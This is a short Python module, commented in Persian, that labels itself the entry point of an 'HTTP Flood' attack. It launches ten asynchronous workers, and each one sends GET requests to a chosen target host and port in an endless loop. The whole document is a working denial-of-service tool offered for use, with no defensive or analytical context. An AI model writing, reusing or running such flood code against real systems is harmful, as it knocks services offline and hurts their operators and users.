import asyncio
import aiohttp
import time
from rich.console import Console

console = Console()

async def worker(url, rate):
    """یک کارگر برای ارسال درخواست HTTP"""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, timeout=5) as resp:
                    console.print(f"[dim]✓ {resp.status}[/dim]", end="")
            except:
                console.print("[dim]✗[/dim]", end="")

def run(target, port, rate):
    """نقطه ورود حمله HTTP Flood"""
    url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
    console.print(f"[yellow]🎯 هدف HTTP: {url}[/yellow]")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [worker(url, rate) for _ in range(10)]
    loop.run_until_complete(asyncio.gather(*tasks))
